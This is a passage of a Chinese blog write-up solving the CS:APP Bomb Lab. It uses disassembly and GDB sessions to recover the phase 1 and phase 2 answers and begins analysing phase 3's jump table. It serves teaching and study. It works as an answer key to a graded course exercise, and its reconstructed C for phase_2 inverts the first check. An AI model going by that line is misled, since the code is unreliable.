<span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400eaa:       e8 b3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401062</span> &lt;phase_5&gt;</div><div class="line">  400eaf:       e8 <span class="number">10</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400eb4:       bf 1a <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40231a,%edi</div><div class="line">  400eb9:       e8 <span class="number">52</span> fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400ebe:       e8 <span class="built_in">db</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400ec3:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400ec6:       e8 <span class="number">29</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  4010f4 &lt;phase_6&gt;</div><div class="line">  400ecb:       e8 f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400ed0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  400ed5:       5b                      <span class="keyword">pop</span>    %rbx</div><div class="line">  400ed6:       c3                      retq   </div></pre></td></tr></table></figure><br>结合讲义中的bomb.c可以得出，main函数每次调用read_line从标准输入流中读入一行字符串，并将其返回值（即字符串的首地址）设置为第一个参数，然后依次调用phase_1到phase_6。</p>
<p>在每一个phase函数内部检查输入的字符串是否正确，如果不正确，则调用explode_bomb函数引爆bomb；否则则返回，返回之后由主函数再继续调用phase_defused解除该阶段。</p>
<p>因此，在每一个阶段中，我们关注的重点应当是phase函数内部以及phase函数所调用的其他函数。</p>
<h4 id="阶段1-phase-1"><a href="#阶段1-phase-1" class="headerlink" title="阶段1 - phase_1"></a>阶段1 - phase_1</h4><p>在bomb-disassemble中观察phase_1的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0000000000400ee0 &lt;phase_1&gt;:</div><div class="line">  400ee0:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  400ee4:       be <span class="number">00</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402400,%esi #设置第二个参数为指针</div><div class="line">  400ee9:       e8 4a <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401338</span> &lt;strings_not_equal&gt; #调用strings_not_equal函数</div><div class="line">  400eee:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</div><div class="line">  400ef0:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400ef7 &lt;phase_1+<span class="number">0x17</span>&gt;</div><div class="line">  400ef2:       e8 <span class="number">43</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #若返回值不为<span class="number">0</span>则引爆bomb</div><div class="line">  400ef7:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  400efb:       c3                      retq  </div></pre></td></tr></table></figure><br>可以看出，phase_1调用了strings_not_equal这个函数，并为该函数配置了第二个参数0x402400，并判断该函数的返回值是否为0，如果为0则返回，否则引爆bomb。</p>
<p>从函数名可以推测，该函数的作用是判断两个字符串是否不相同，如果不相同，则返回非0值，相同则返回0。</p>
<p>还可以推测，该函数的第一个参数%rdi中存放了我们输入的字符串的首地址，而第二个参数%rsi指向了待比较的字符串的首地址——也就是阶段1的答案。</p>
<p>下面在GDB中验证推测。使用GDB运行bomb，为phase_1和explode_bomb添加断点。然后输入测试字符串”Test”，进入phase_1后用print分别打印输出%rdi和%rsi所指向的字符串。</p>
<p>首先是设置断点的相关命令及结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> explode_bomb</div><div class="line">Breakpoint 1 at 0x40143a</div><div class="line">(gdb) <span class="built_in">break</span> phase_1</div><div class="line">Breakpoint 2 at 0x400ee0</div></pre></td></tr></table></figure><br>然后是运行程序及输入测试字符串的相关命令及结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) run</div><div class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb</div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</div><div class="line">Test</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400ee0 <span class="keyword">in</span> phase_1 ()</div></pre></td></tr></table></figure><br>然后我们查看%rdi所指向的字符串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">print</span> (char *)(<span class="variable">$rdi</span>)</div><div class="line"><span class="variable">$1</span> = 0x603780 &lt;input_strings&gt; <span class="string">"Test"</span></div></pre></td></tr></table></figure><br>发现%rdi果然指向了我们输入的字符串。然后我们单步执行程序至调用strings_not_equal函数之前，查看%rsi所指向的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) print (char *)($rsi)</div><div class="line">$2 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</div></pre></td></tr></table></figure><br>我们已经得到了phase_1的答案，就是”Border relations with Canada have never been better.”</p>
<p>下面我们重新执行bomb并测试，输出”Phase 1 defused. How about the next one?”，phase_1解决。</p>
<h4 id="阶段2-phase-2"><a href="#阶段2-phase-2" class="headerlink" title="阶段2 - phase_2"></a>阶段2 - phase_2</h4><p>在bomb-disassemble中观察phase_2的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">0000000000400efc &lt;phase_2&gt;:</div><div class="line">  400efc:       <span class="number">55</span>                      <span class="keyword">push</span>   %rbp</div><div class="line">  400efd:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</div><div class="line">  400efe:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</div><div class="line">  400f02:       <span class="number">48</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%rsi</div><div class="line">  400f05:       e8 <span class="number">52</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40145c &lt;read_six_numbers&gt; #从输入的字符串中读入<span class="number">6</span>个数字</div><div class="line">  400f0a:       <span class="number">83</span> 3c <span class="number">24</span> <span class="number">01</span>             cmpl   <span class="number">$0</span>x1,(%rsp)</div><div class="line">  400f0e:       <span class="number">74</span> <span class="number">20</span>                   <span class="keyword">je</span>     400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</div><div class="line">  400f10:       e8 <span class="number">25</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #如果第一个数字不为<span class="number">1</span>则引爆炸弹</div><div class="line">  400f15:       eb <span class="number">19</span>                   <span class="keyword">jmp</span>    400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</div><div class="line">  400f17:       8b <span class="number">43</span> fc                <span class="keyword">mov</span>    -<span class="number">0x4</span>(%rbx),%eax</div><div class="line">  400f1a:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</div><div class="line">  # 计算前一个元素*<span class="number">2</span></div><div class="line">  400f1c:       <span class="number">39</span> <span class="number">03</span>                   <span class="keyword">cmp</span>    %eax,(%rbx)</div><div class="line">  400f1e:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400f25 &lt;phase_2+<span class="number">0x29</span>&gt;</div><div class="line">  400f20:       e8 <span class="number">15</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #若当前元素不等于前一个元素*<span class="number">2</span>则引爆bomb</div><div class="line">  400f25:       <span class="number">48</span> <span class="number">83</span> c3 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rbx</div><div class="line">  400f29:       <span class="number">48</span> <span class="number">39</span> eb                <span class="keyword">cmp</span>    %rbp,%rbx</div><div class="line">  400f2c:       <span class="number">75</span> e9                   <span class="keyword">jne</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</div><div class="line">  # 指向下一个元素</div><div class="line">  400f2e:       eb 0c                   <span class="keyword">jmp</span>    400f3c &lt;phase_2+<span class="number">0x40</span>&gt;</div><div class="line">  400f30:       <span class="number">48</span> <span class="number">8d</span> 5c <span class="number">24</span> <span class="number">04</span>          <span class="keyword">lea</span>    <span class="number">0x4</span>(%rsp),%rbx</div><div class="line">  400f35:       <span class="number">48</span> <span class="number">8d</span> 6c <span class="number">24</span> <span class="number">18</span>          <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rbp #设置b和bEnd</div><div class="line">  400f3a:       eb <span class="built_in">db</span>                   <span class="keyword">jmp</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</div><div class="line">  400f3c:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>             <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</div><div class="line">  400f40:       5b                      <span class="keyword">pop</span>    %rbx</div><div class="line">  400f41:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %rbp</div><div class="line">  400f42:       c3                      retq   </div></pre></td></tr></table></figure><br>可以看出，在phase_2的一开始调用了read_six_numbers这个函数，初步推测这是用来从输入字符串中读取六个数字的函数，其将输入字符串的地址作为第一个参数，将栈顶指针%rsp作为第二个参数，下面我们查看read_six_numbers的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">000000000040145c &lt;read_six_numbers&gt;:</div><div class="line">  40145c:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  <span class="number">401460</span>:       <span class="number">48</span> <span class="number">89</span> f2                <span class="keyword">mov</span>    %rsi,%rdx</div><div class="line">  <span class="number">401463</span>:       <span class="number">48</span> <span class="number">8d</span> 4e <span class="number">04</span>             <span class="keyword">lea</span>    <span class="number">0x4</span>(%rsi),%rcx</div><div class="line">  <span class="number">401467</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">46</span> <span class="number">14</span>             <span class="keyword">lea</span>    <span class="number">0x14</span>(%rsi),%rax</div><div class="line">  40146b:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x8</span>(%rsp)</div><div class="line">  <span class="number">401470</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">46</span> <span class="number">10</span>             <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsi),%rax</div><div class="line">  <span class="number">401474</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             <span class="keyword">mov</span>    %rax,(%rsp)</div><div class="line">  <span class="number">401478</span>:       4c <span class="number">8d</span> 4e 0c             <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsi),%r9</div><div class="line">  40147c:       4c <span class="number">8d</span> <span class="number">46</span> <span class="number">08</span>             <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsi),%r8</div><div class="line">  <span class="number">401480</span>:       be c3 <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025c3,%esi</div><div class="line">  <span class="number">401485</span>:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  # 为sscanf配置参数</div><div class="line">  40148a:       e8 <span class="number">61</span> f7 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</div><div class="line">  # 调用sscanf(input, <span class="string">"%d %d %d %d %d %d"</span>, &amp;a[<span class="number">0</span>], &amp;a[<span class="number">1</span>], &amp;a[<span class="number">2</span>], &amp;a[<span class="number">3</span>], &amp;a[<span class="number">4</span>], &amp;a[<span class="number">5</span>])<span class="comment">;</span></div><div class="line">  40148f:       <span class="number">83</span> f8 <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</div><div class="line">  <span class="number">401492</span>:       7f <span class="number">05</span>                   <span class="keyword">jg</span>     <span class="number">401499</span> &lt;read_six_numbers+<span class="number">0x3d</span>&gt;</div><div class="line">  <span class="number">401494</span>:       e8 a1 ff ff ff          callq  40143a &lt;explode_bomb&gt; #若读取成功的数字数小于<span class="number">6</span>则引爆bomb</div><div class="line">  <span class="number">401499</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  <span class="number">40149d</span>:       c3                      retq   </div></pre></td></tr></table></figure><br>可以看出，该函数在0x401460-0x401480为函数的调用构造了参数，在0x401485将返回值置0，并在0x40148a处调用了sscanf函数。并且检查sscanf函数的返回值（读取成功的变量个数），如果返回值&lt;=5，则引爆bomb，否则则正确返回。</p>
<p>下面我们重点观察调用函数的参数构造过程。%rdi是第1个参数，指向了输入的字符串，推测第2个参数%rsi应该指向了格式化字符串的首地址，且该字符串为”%d %d %d %d %d %d”。%rdx是第3个参数，为%rsi+0，%rcx是第4个参数，为%rsi+4，%r8是第5个参数，为%rsi+8，%r9是第6个参数，为%rsi+12。(%rsp)是第7个参数，为%rsi+16，(%rsp+8)是第8个参数，为%rsi+20。</p>
<p>可以归纳出read_six_numbers接收2个参数，其中第1个参数为输入字符串的首地址，第2个参数为6元素的int型数组的首地址，该函数从输入字符串中读取6个数字，并且将这6个数字存入第2个参数所指向的int型数组中。但如果读取的数字不足6个，则会引爆bomb。</p>
<p>然后我们回到phase_2函数中，将phase_2函数逆向，可以得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_2</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> a[<span class="number">6</span>];</div><div class="line">	read_six_numbers(input, a);</div><div class="line">	<span class="keyword">if</span> (a[<span class="number">0</span>] == <span class="number">1</span>) explode_bomb();</div><div class="line">	<span class="keyword">int</span> * b = &amp;a[<span class="number">1</span>], * bEnd = &amp;a[<span class="number">6</span>];</div><div class="line">	<span class="keyword">do</span> &#123;</div><div class="line">		<span class="keyword">int</span> val = (*(b<span class="number">-1</span>)) * <span class="number">2</span>;</div><div class="line">		<span class="keyword">if</span> (*b != val) explode_bomb();</div><div class="line">		b++;</div><div class="line">	&#125; <span class="keyword">while</span> (b != bEnd);</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>从上述的代码可以明显地看出编译器对于定长数组的优化，编译器使用了指针间接引用替代了数组引用。<br>上述代码依次检查了读入的6个数字，第1个数字必须为1，从第2个数字开始，每一个数字都必须是上一个数字的两倍，否则将会引爆bomb。显然，phase_2的答案为”1 2 4 8 16 32”。</p>
<p>下面我们在GDB中验证得出的结果。我们为explode_bomb、phase_2和read_six_numbers设置断点，在phase_2中输入”1 2 4 8 16 32”，并且在进入read_six_numbers函数后观察%rsi所指向的字符串是否为”%d %d %d %d %d %d”。这里为了方便起见，我们将phase_1的结果写入test.txt并读入。相关命令与结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> explode_bomb</div><div class="line">Breakpoint 1 at 0x40143a</div><div class="line">(gdb) <span class="built_in">break</span> phase_2</div><div class="line">Breakpoint 2 at 0x400efc</div><div class="line">(gdb) <span class="built_in">break</span> read_six_numbers</div><div class="line">Breakpoint 3 at 0x40145c</div><div class="line">(gdb) run test.txt</div><div class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb test.txt</div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400efc <span class="keyword">in</span> phase_2 ()</div><div class="line">(gdb) <span class="built_in">continue</span></div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 3, 0x000000000040145c <span class="keyword">in</span> read_six_numbers ()</div><div class="line">(gdb) stepi 10</div><div class="line">0x0000000000401485 <span class="keyword">in</span> read_six_numbers ()</div><div class="line">(gdb) <span class="built_in">print</span> (char *)(<span class="variable">$rsi</span>)</div><div class="line"><span class="variable">$1</span> = 0x4025c3 <span class="string">"%d %d %d %d %d %d"</span></div><div class="line">(gdb) <span class="built_in">continue</span></div><div class="line">Continuing.</div><div class="line">That<span class="string">'s number 2.  Keep going!</span></div></pre></td></tr></table></figure></p>
<h4 id="阶段3-phase-3"><a href="#阶段3-phase-3" class="headerlink" title="阶段3 - phase_3"></a>阶段3 - phase_3</h4><p>在bomb-disassemble中观察phase_3的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">0000000000400f43 &lt;phase_3&gt;:</div><div class="line">  400f43:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  400f47:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</div><div class="line">  400f4c:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</div><div class="line">  400f51:       be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</div><div class="line">  400f56:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  400f5b:       e8 <span class="number">90</span> fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</div><div class="line">  # 从输入的字符串中读取两个数字 并存入局部变量中</div><div class="line">  400f60:       <span class="number">83</span> f8 <span class="number">01</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%eax</div><div class="line">  400f63:       7f <span class="number">05</span>                   <span class="keyword">jg</span>     400f6a &lt;phase_3+<span class="number">0x27</span>&gt;</div><div class="line">  400f65:       e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 若读取成功的数字不足两个 则引爆bomb</div><div class="line">  400f6a:       <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>          cmpl   <span class="number">$0</span>x7,<span class="number">0x8</span>(%rsp)</div><div class="line">  400f6f:       <span class="number">77</span> 3c                   <span class="keyword">ja</span>     400fad &lt;phase_3+<span class="number">0x6a</span>&gt; # 若第一个数字（无符号）大于<span class="number">7</span> 则引爆bomb</div><div class="line">  400f71:       8b <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</div><div class="line">  400f75:       ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>    jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)</div><div class="line">  400f7c:       b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xcf,%eax</div><div class="line">  400f81:       eb 3b                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400f83:       b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x2c3,%eax</div><div class="line">  400f88:       eb <span class="number">34</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400f8a:       b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x100,%eax</div><div class="line">  400f8f:       eb <span class="number">2d</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400f91:       b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x185,%eax</div><div class="line">  400f96:       eb <span class="number">26</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400f98:       b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xce,%eax</div><div class="line">  400f9d:       eb 1f                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400f9f:       b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x2aa,%eax</div><div class="line">  400fa4:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400fa6:       b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x147,%eax</div><div class="line">  400fab:       eb <span class="number">11</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400fad:       e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  400fb2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  400fb7:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</div><div class="line">  400fb9:       b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x137,%eax # switch语句</div><div class="line">  400fbe:       3b <span class="number">44</span> <span class="number">24</span> 0c             <span class="keyword">cmp</span>    <span class="number">0xc</span>(%rsp),%eax</div><div class="line">  400fc2:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400fc9 &lt;phase_3+<span class="number">0x86</span>&gt; # 判断a和b是否相等 不想等则引爆炸弹</div><div class="line">  400fc4:       e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  400fc9:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  400fcd:       c3                      retq</div></pre></td></tr></table></figure><br>推测phase_3的一开始用sscanf从输入字符串中读入了2个int型数字。</p>
<p>然后观察phase_3中的jmpq ×0x402470(,%rax,8)以及下面的mov与jmp指令，基本上可以肯定这是使用跳转表实现的switch语句。</p>
<p>下面在GDB中验证并记录不同%rax的值对应跳转表的不同跳转位置。具体的命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> explode_bomb</div><div class="line">Breakpoint 1 at 0x40143a</div><div class="line">(gdb) <span class="built_in">break</span> phase_3</div><div class="line">Breakpoint 2 at 0x400f43</div><div class="line">(gdb) run test.txt</div><div class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb test.txt</div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">That<span class="string">'s number 2.  Keep going!</span></div><div class="line">1 1</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400f43 in phase_3 ()</div><div class="line">(gdb) stepi 4</div><div class="line">0x0000000000400f56 in phase_3 ()</div><div class="line">(gdb) print (char *)($rsi)</div><div class="line">$1 = 0x4025cf "%d %d"</div><div class="line">(gdb) print /x *(long *)(0x402470+0)</div><div class="line">$2 = 0x400f7c</div><div class="line">(gdb) print /x *(long *)(0x402470+8)</div><div class="line">$3 = 0x400fb9</div><div class="line">(gdb) print /x *(long *)(0x402470+16)</div><div class="line">$4 = 0x400f83</div><div class="line">(gdb) print /x *(long *)(0x402470+24)</div><div class="line">$5 = 0x400f8a</div><div class="line">(gdb) print /x *(long *)(0x402470+32)</div><div class="line">$6 = 0x400f91</div><div class="line">(gdb) print /x *(long *)(0x402470+40)</div><div class="line">$7 = 0x400f98</div><div class="line">(gdb) print /x *(long *)(0x402470+48)</div><div class="line">$8 = 0x400f9f</div><div class="line">(gdb) print /x *(long *)(0x402470+56)</div><div class="line">$9 = 0x400fa6</div></pre></td></tr></table></figure><br>从GDB运行的结果可以看出，sscanf确实读入了两个int *数字，并且也得到了所有的%rax对应的跳转表的不同跳转位置。我们已经有了足够的信息来进行phase_3的逆向。</p>
